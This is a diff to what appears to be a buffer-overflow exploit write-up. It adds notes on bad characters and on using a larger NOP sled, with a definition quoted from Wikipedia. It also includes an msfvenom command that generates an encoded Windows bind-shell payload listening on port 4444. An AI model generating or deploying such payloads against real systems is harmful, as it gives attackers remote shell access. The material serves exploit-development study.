@@ -31,6 +31,14 @@ I have discovered the following characters being bad: `0x0 0xA 0xD`
 
 # Lastly, we need to write a payload.
 This will remove the bad chars in the exploit for it to make work.
+Also, when writing I noticed the 16 0x90's aka a NO op in assembly which literally does nothing, I have inserted 32 instead of 16 of them and that's when my payload initially began to work.
+
+
+### Purpose of this NOP sled?
+##### Source: https://en.wikipedia.org/wiki/NOP_slide
+(no-operation) instructions meant to "slide" the CPU's instruction execution flow to its final, desired destination whenever the program branches to a memory address anywhere on the slide. 
+
+
 msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LPORT=4444 -b '\x00\x0a\x0d' -f python -e x86/alpha_mixed
 
 
